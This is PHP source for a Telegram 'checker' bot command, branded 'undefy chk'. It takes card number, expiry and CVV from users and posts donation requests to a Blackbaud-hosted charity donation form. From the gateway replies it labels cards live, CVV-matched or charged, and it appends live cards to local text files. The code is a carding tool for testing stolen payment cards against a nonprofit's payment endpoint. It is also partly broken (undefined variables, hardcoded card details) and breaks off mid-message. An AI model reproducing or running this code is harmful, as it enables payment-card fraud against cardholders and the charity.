<?php
/include __DIR__."/../config/variables.php";
include __DIR__."/config/users.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/functions.php";


if ((strpos($message, "/bad") === 0)||(strpos($message, "!bad") === 0)||(strpos($message, ".bad") === 0)){
if(!in_array($chat_id, $auchats)){
    if($usertype == 'free'){
        bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"<b>you are not a premium user </b>",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
            ]);
        return;
    }
}
$message = substr($message, 5);
$messageidtoedit1 = bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"<b>CHECKING..🟥</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id
]);

$messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
$amt = '3';


if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"Invalid details \nFormat -> cc|mm|yy|cvv",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    return;
};
if(strlen($ano) == '4'){
    $an = substr($ano, 2);
}
else{
  $an = $ano;
}
{
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"CHECKING..🟧🟧",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
 }
    $amount = $amt * 100;
//------------Card info------------//
$lista = ''.$cc.'|'.$mes.'|'.$an.'|'.$cvv.'';
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://bbox.blackbaudhosting.com/webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler HTTP/1.1',
'Host: bbox.blackbaudhosting.com',
'Connection: keep-alive',
'Accept: **',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://bbox.blackbaudhosting.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://bbox.blackbaudhosting.com/webforms/custom/mongo/scripts/MongoServer.html?xdm_e=https%3A%2F%2Fwww.foundationsineducation.org&xdm_c=default2087&xdm_p=1',
'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'bboxdonation%24gift%24GivingLevel=rdGivingLevel12&bboxdonation%24gift%24txtOtherAmountButtons=%2410.00&bboxdonation%24gift%24txtAmountPledge=&bboxdonation%24gift%24hdnGivingLevelButtonsEnabled=true&bboxdonation%24gift%24hdnPledgeDuration=&bboxdonation%24gift%24hdnPledgePayment=&bboxdonation%24gift%24hdnGiftButtonsStyle=&bboxdonation%24tribute%24ddTributeTypes=2672&bboxdonation%24tribute%24txtTributeRecordName=&bboxdonation%24tribute%24hdnAllowTributeNotification=0&bboxdonation%24tribute%24txtFirstName=&bboxdonation%24tribute%24txtLastName=&bboxdonation%24tribute%24tributeAddress%24ddCountry=United+States&bboxdonation%24tribute%24tributeAddress%24txtAddress=&bboxdonation%24tribute%24tributeAddress%24txtCity=&bboxdonation%24tribute%24tributeAddress%24ddState=&bboxdonation%24tribute%24tributeAddress%24txtZip=&bboxdonation%24tribute%24tributeAddress%24txtUKCity=&bboxdonation%24tribute%24tributeAddress%24ddUKCounty=&bboxdonation%24tribute%24tributeAddress%24txtUKPostCode=&bboxdonation%24tribute%24tributeAddress%24txtCACity=&bboxdonation%24tribute%24tributeAddress%24ddCAProvince=&bboxdonation%24tribute%24tributeAddress%24txtCAPostCode=&bboxdonation%24tribute%24tributeAddress%24txtAUCity=&bboxdonation%24tribute%24tributeAddress%24ddAUState=&bboxdonation%24tribute%24tributeAddress%24txtAUPostCode=&bboxdonation%24tribute%24tributeAddress%24ddNZSuburb=&bboxdonation%24tribute%24tributeAddress%24ddNZCity=&bboxdonation%24tribute%24tributeAddress%24txtNZPostCode=&bboxdonation%24designation%24ddDesignations=816&bboxdonation%24designation%24txtOtherDesignation=&bboxdonation%24recurrence%24ddFrequency=2&bboxdonation%24recurrence%24ddFrequencyDate=1&bboxdonation%24recurrence%24hdnRecurringOnly=&bboxdonation%24recurrence%24hdnDateOptions=%5B%7B%22frequency%22%3A2%2C%22values%22%3A%221%3B15%22%2C%22paymentDates%22%3A%2201-09-2023%3B15-08-2023%22%7D%2C%7B%22frequency%22%3A3%2C%22values%22%3A%221%3B15%22%2C%22paymentDates%22%3A%2201-09-2023%3B15-08-2023%22%7D%5D&bboxdonation%24recurrence%24hdnRecurringOptionValue=1&bboxdonation%24payment%24txtCardholder=Badboy&bboxdonation%24payment%24txtCardNumber=4315030000061704&bboxdonation%24payment%24cboCardType=5963a708-fc7f-48af-952f-16d574c4b833&bboxdonation%24payment%24cboMonth=12&bboxdonation%24payment%24cboYear=2023&bboxdonation%24payment%24txtCSC=000&bboxdonation%24payment%24hdnMerchantAccountId=648e44fc-16aa-4682-adbd-fb31281e0d73&bboxdonation%24billing%24txtOrgName=&bboxdonation%24billing%24ddTitle=Dr.&bboxdonation%24billing%24txtFirstName=Legend&bboxdonation%24billing%24txtLastName=Hr&bboxdonation%24billing%24txtEmail=legendhr75%40gmail.com&bboxdonation%24billing%24txtPhone=3049788768&bboxdonation%24billing%24billingAddress%24ddCountry=United+States&bboxdonation%24billing%24billingAddress%24txtAddress=736+street&bboxdonation%24billing%24billingAddress%24txtCity=California+&bboxdonation%24billing%24billingAddress%24ddState=CA&bboxdonation%24billing%24billingAddress%24txtZip=90023&bboxdonation%24billing%24billingAddress%24txtUKCity=California+&bboxdonation%24billing%24billingAddress%24ddUKCounty=&bboxdonation%24billing%24billingAddress%24txtUKPostCode=90023&bboxdonation%24billing%24billingAddress%24txtCACity=California+&bboxdonation%24billing%24billingAddress%24ddCAProvince=CA&bboxdonation%24billing%24billingAddress%24txtCAPostCode=90023&bboxdonation%24billing%24billingAddress%24txtAUCity=California+&bboxdonation%24billing%24billingAddress%24ddAUState=CA&bboxdonation%24billing%24billingAddress%24txtAUPostCode=90023&bboxdonation%24billing%24billingAddress%24ddNZSuburb=&bboxdonation%24billing%24billingAddress%24ddNZCity=&bboxdonation%24billing%24billingAddress%24txtNZPostCode=90023&bboxdonation%24billing%24chkAnonymous=on&bboxdonation%24comment%24txtComments=&g-recaptcha-response=03ADUVZwDM8_aflR9w3jR3lYoP67Ax0wKeLeN3PKKFbBvjqnN2AhLcJkN-zSv08YdGKAck6zRan86vrGza6JCOAsuPLe3QA2e2bZJtDs0uKt3GF2LEvEaM8a1K3XFPBa1k28A0HecOeREfhLVBMtfw4cWUzhVruw3KT3dNL0CIIL_YREejexOIpM33X06bTu9Um0g481xF6iubAJ91fcKpFqeqSAWHQw69O0OhzTd3CEfwn1FlIF0aeeq9Icn0Q_u4_lF8aI18lxZSlUinwi03ONmIiSAy4V3j3vcPJfvuHy6nCQcEIkbEmq22pKPjcCoz1pgzbyB7UIFV27dls2uPTqbGKoFn9Q6HuA6T5wcxbMDnCViVAA0hAustctlWlqYvEQYXraccjryrIyiYcZn09UMm_ZjPo2bTmsJtIq2kxK8p24djYLVjIigtWf9YLi19XZ9Hp958vwBPVU0i6YbSDrjpTDQ6sveH01jtlqzD3wh081PpolbbyNPpf4W0yRcA-BtCjIqVslpvgagM32_g7_1Y8CRCBQ3EfqskVmWidcAD9tz416PNLjzwcP3A87mAzaDhuHPQRm1uCTHV_TZ9qq-D9H2UVSwuOQUARg4dKzE2GoLnrlFUEWY&bboxdonation%24hdnJsonFieldProps=&bboxdonation%24hdnMongoInstanceID=&bboxdonation%24hdnMetaTag=1&bboxdonation%24hdnEmailInfo=%7B%7D&bboxdonation%24hdnHideDirectDebitForOneTimeGift=&bboxdonation%24hdnDateTimeOffset=330&bboxdonation%24hdnReCAPTCHASettings=%7B%22isEnabled%22%3Atrue%2C%22sitekey%22%3A%226LdkFJMUAAAAAB1v49N1aaMoEPH85Qvfib4VqlNH%22%2C%22isAlwaysVisible%22%3Afalse%7D&bboxdonation%24hdnMixpanelToken=&bboxdonation%24hdnBBCheckoutPublicKey=&bboxdonation%24hdnBBCheckoutTransactionID=&bboxdonation%24hdnBBCheckoutCardToken=&bboxdonation%24hdnBBCheckoutProcessNow=&bboxdonation%24hdnSecurePaymentClicked=false&bboxdonation%24hdnBBCheckoutAmount=&bboxdonation%24hdnBBShowDirectDebitConfirmationBox=0&bboxdonation%24hdnDonorCoverEnabled=0&bboxdonation%24hdnAuthorizedAmount=0&bboxdonation%24hdnDonorCoveredAmount=0&bboxdonation%24hdnDonorCovered=0&instanceId=e04335f6-e53e-4b11-bd14-675e1bd74ba8&partId=bd3b277e-c489-4983-b786-919c6da2512a&srcUrl=https%3A%2F%2Fwww.foundationsineducation.org%2Fdonate%2F&bboxdonation$btnSubmit=Donate');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$last4 = trim(strip_tags(getStr($result1,'"Last4": "','"')));
$brand = trim(strip_tags(getStr($result1,'"Brand": "','"')));
$ac = trim(strip_tags(getStr($result1,'"AccessToken": "','"')));
{
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» $result4
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅

❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
      }
//=======================[4 REQ-END]==============================//
//// $headers[] = 
$email1 = 'wilsonnaas'.rand(11,999).'%40gmail.com';
//=======================[5 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://bbox.blackbaudhosting.com/webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /webforms/components/custom.ashx?handler=blackbaud.appfx.mongo.parts.postformhandler HTTP/1.1',
'Host: bbox.blackbaudhosting.com',
'Connection: keep-alive',
'Accept: *',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://bbox.blackbaudhosting.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://bbox.blackbaudhosting.com/webforms/custom/mongo/scripts/MongoServer.html?xdm_e=https%3A%2F%2Fwww.foundationsineducation.org&xdm_c=default2087&xdm_p=1',
'Accept-Language: en-IN,en-US;q=0.9,en;q=0.8',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'bboxdonation%24gift%24GivingLevel=rdGivingLevel12&bboxdonation%24gift%24txtOtherAmountButtons=%2410.00&bboxdonation%24gift%24txtAmountPledge=&bboxdonation%24gift%24hdnGivingLevelButtonsEnabled=true&bboxdonation%24gift%24hdnPledgeDuration=&bboxdonation%24gift%24hdnPledgePayment=&bboxdonation%24gift%24hdnGiftButtonsStyle=&bboxdonation%24tribute%24ddTributeTypes=2672&bboxdonation%24tribute%24txtTributeRecordName=&bboxdonation%24tribute%24hdnAllowTributeNotification=0&bboxdonation%24tribute%24txtFirstName=&bboxdonation%24tribute%24txtLastName=&bboxdonation%24tribute%24tributeAddress%24ddCountry=United+States&bboxdonation%24tribute%24tributeAddress%24txtAddress=&bboxdonation%24tribute%24tributeAddress%24txtCity=&bboxdonation%24tribute%24tributeAddress%24ddState=&bboxdonation%24tribute%24tributeAddress%24txtZip=&bboxdonation%24tribute%24tributeAddress%24txtUKCity=&bboxdonation%24tribute%24tributeAddress%24ddUKCounty=&bboxdonation%24tribute%24tributeAddress%24txtUKPostCode=&bboxdonation%24tribute%24tributeAddress%24txtCACity=&bboxdonation%24tribute%24tributeAddress%24ddCAProvince=&bboxdonation%24tribute%24tributeAddress%24txtCAPostCode=&bboxdonation%24tribute%24tributeAddress%24txtAUCity=&bboxdonation%24tribute%24tributeAddress%24ddAUState=&bboxdonation%24tribute%24tributeAddress%24txtAUPostCode=&bboxdonation%24tribute%24tributeAddress%24ddNZSuburb=&bboxdonation%24tribute%24tributeAddress%24ddNZCity=&bboxdonation%24tribute%24tributeAddress%24txtNZPostCode=&bboxdonation%24designation%24ddDesignations=816&bboxdonation%24designation%24txtOtherDesignation=&bboxdonation%24recurrence%24ddFrequency=2&bboxdonation%24recurrence%24ddFrequencyDate=1&bboxdonation%24recurrence%24hdnRecurringOnly=&bboxdonation%24recurrence%24hdnDateOptions=%5B%7B%22frequency%22%3A2%2C%22values%22%3A%221%3B15%22%2C%22paymentDates%22%3A%2201-09-2023%3B15-08-2023%22%7D%2C%7B%22frequency%22%3A3%2C%22values%22%3A%221%3B15%22%2C%22paymentDates%22%3A%2201-09-2023%3B15-08-2023%22%7D%5D&bboxdonation%24recurrence%24hdnRecurringOptionValue=1&bboxdonation%24payment%24txtCardholder=Badboy&bboxdonation%24payment%24txtCardNumber=4315030000061704&bboxdonation%24payment%24cboCardType=5963a708-fc7f-48af-952f-16d574c4b833&bboxdonation%24payment%24cboMonth=12&bboxdonation%24payment%24cboYear=2023&bboxdonation%24payment%24txtCSC=000&bboxdonation%24payment%24hdnMerchantAccountId=648e44fc-16aa-4682-adbd-fb31281e0d73&bboxdonation%24billing%24txtOrgName=&bboxdonation%24billing%24ddTitle=Dr.&bboxdonation%24billing%24txtFirstName=Legend&bboxdonation%24billing%24txtLastName=Hr&bboxdonation%24billing%24txtEmail=legendhr75%40gmail.com&bboxdonation%24billing%24txtPhone=3049788768&bboxdonation%24billing%24billingAddress%24ddCountry=United+States&bboxdonation%24billing%24billingAddress%24txtAddress=736+street&bboxdonation%24billing%24billingAddress%24txtCity=California+&bboxdonation%24billing%24billingAddress%24ddState=CA&bboxdonation%24billing%24billingAddress%24txtZip=90023&bboxdonation%24billing%24billingAddress%24txtUKCity=California+&bboxdonation%24billing%24billingAddress%24ddUKCounty=&bboxdonation%24billing%24billingAddress%24txtUKPostCode=90023&bboxdonation%24billing%24billingAddress%24txtCACity=California+&bboxdonation%24billing%24billingAddress%24ddCAProvince=CA&bboxdonation%24billing%24billingAddress%24txtCAPostCode=90023&bboxdonation%24billing%24billingAddress%24txtAUCity=California+&bboxdonation%24billing%24billingAddress%24ddAUState=CA&bboxdonation%24billing%24billingAddress%24txtAUPostCode=90023&bboxdonation%24billing%24billingAddress%24ddNZSuburb=&bboxdonation%24billing%24billingAddress%24ddNZCity=&bboxdonation%24billing%24billingAddress%24txtNZPostCode=90023&bboxdonation%24billing%24chkAnonymous=on&bboxdonation%24comment%24txtComments=&g-recaptcha-response=03ADUVZwDM8_aflR9w3jR3lYoP67Ax0wKeLeN3PKKFbBvjqnN2AhLcJkN-zSv08YdGKAck6zRan86vrGza6JCOAsuPLe3QA2e2bZJtDs0uKt3GF2LEvEaM8a1K3XFPBa1k28A0HecOeREfhLVBMtfw4cWUzhVruw3KT3dNL0CIIL_YREejexOIpM33X06bTu9Um0g481xF6iubAJ91fcKpFqeqSAWHQw69O0OhzTd3CEfwn1FlIF0aeeq9Icn0Q_u4_lF8aI18lxZSlUinwi03ONmIiSAy4V3j3vcPJfvuHy6nCQcEIkbEmq22pKPjcCoz1pgzbyB7UIFV27dls2uPTqbGKoFn9Q6HuA6T5wcxbMDnCViVAA0hAustctlWlqYvEQYXraccjryrIyiYcZn09UMm_ZjPo2bTmsJtIq2kxK8p24djYLVjIigtWf9YLi19XZ9Hp958vwBPVU0i6YbSDrjpTDQ6sveH01jtlqzD3wh081PpolbbyNPpf4W0yRcA-BtCjIqVslpvgagM32_g7_1Y8CRCBQ3EfqskVmWidcAD9tz416PNLjzwcP3A87mAzaDhuHPQRm1uCTHV_TZ9qq-D9H2UVSwuOQUARg4dKzE2GoLnrlFUEWY&bboxdonation%24hdnJsonFieldProps=&bboxdonation%24hdnMongoInstanceID=&bboxdonation%24hdnMetaTag=1&bboxdonation%24hdnEmailInfo=%7B%7D&bboxdonation%24hdnHideDirectDebitForOneTimeGift=&bboxdonation%24hdnDateTimeOffset=330&bboxdonation%24hdnReCAPTCHASettings=%7B%22isEnabled%22%3Atrue%2C%22sitekey%22%3A%226LdkFJMUAAAAAB1v49N1aaMoEPH85Qvfib4VqlNH%22%2C%22isAlwaysVisible%22%3Afalse%7D&bboxdonation%24hdnMixpanelToken=&bboxdonation%24hdnBBCheckoutPublicKey=&bboxdonation%24hdnBBCheckoutTransactionID=&bboxdonation%24hdnBBCheckoutCardToken=&bboxdonation%24hdnBBCheckoutProcessNow=&bboxdonation%24hdnSecurePaymentClicked=false&bboxdonation%24hdnBBCheckoutAmount=&bboxdonation%24hdnBBShowDirectDebitConfirmationBox=0&bboxdonation%24hdnDonorCoverEnabled=0&bboxdonation%24hdnAuthorizedAmount=0&bboxdonation%24hdnDonorCoveredAmount=0&bboxdonation%24hdnDonorCovered=0&instanceId=e04335f6-e53e-4b11-bd14-675e1bd74ba8&partId=bd3b277e-c489-4983-b786-919c6da2512a&srcUrl=https%3A%2F%2Fwww.foundationsineducation.org%2Fdonate%2F&bboxdonation$btnSubmit=Donate');



$result2 = curl_exec($ch);
$id = trim(strip_tags(getStr($result2,'"id": "','"')));
$last4 = trim(strip_tags(getStr($result2,'"Last4": "','"')));
$brand = trim(strip_tags(getStr($result2,'"Brand": "','"')));
$ac = trim(strip_tags(getStr($result2,'"AccessToken": "','"')));
$msg = trim(strip_tags(getStr($result2,'"message": "','"'))); 
$msg1 = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
   {
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"CHECKING..🟩🟩🟩🟩",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
      }
      
      
if(strpos($result2, "Your card’s security code is incorrect.")) {
  $pass = 'CCN LIVE ✅'; {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» Your card’s security code is incorrect✅
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅

❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
      file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
}
elseif(strpos($result2, "incorrect_cvc"))  {
  $pass = 'CCN LIVE ✅';
   {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» Your card’s security code is incorrect.✅
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅

❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
      file_put_contents('./tmp/ccn.txt', $lista . PHP_EOL, FILE_APPEND);
}
elseif(strpos($result2, "Your card has insufficient funds.")) {
  $pass = 'CVV MATCHED ✅';
   {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» Your card has insufficient funds✅
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅

❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
        file_put_contents('./tmp/cvv.txt', $lista . PHP_EOL, FILE_APPEND);
}
elseif (strpos($result2, "Your card does not supports this type of purchase.") || strpos($result2, "Your card does not supports this type of purchase.")) {
  $pass = 'LIVE..! ✅';
   {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» Your card does not supports this type of purchase. ✅
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅

❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
      file_put_contents('./tmp/ccn.txt', $lista . PHP_EOL, FILE_APPEND);
}

elseif(strpos($result2, "Your card was declined."))  {
  $pass = 'DECLINED ❌';
   {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» Your card was declined
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅
❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
}
elseif (strpos($result2, "succeeded") || strpos($result2, '"cvc_check": "pass"')) {
  $pass = 'CHARGED ✅';
   {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» Payment complete
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅
❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
✮𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 BY ➺ <a href='https://t.me/balenottere'>undefy</a> x <a href='https://t.me/undefychatchk'>join chat</a>
    －－－－－－－－－－－－－－－－",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
}
elseif (strpos($result2, "GENERIC DECLINED") || strpos($result2, "FRAUDULENT")) {
  $pass = 'DECLINED ❌';
   {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"❆═══»undefy chk«═══❆
✮ᴄᴀʀᴅ -» <code>$lista</code> 
✮STATUS-» $pass
✮ƦESPONSE -» $pass
✮GATEWAY -» Stripe Charge $2
-———-»ɪɴꜰᴏ«-———-
✮TYPE -»  $type
✮ʙᴀɴᴋ -» $bank
✮ᴄᴏᴜɴᴛʀʏ -» $name $emoji $currency
✮Proxy -» Live..! ✅

❆═══»Undefy chk«═══❆
✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ: 😈 <a href='tg://user?id=$userId'>$firstname</a> 😈 ✅️ 
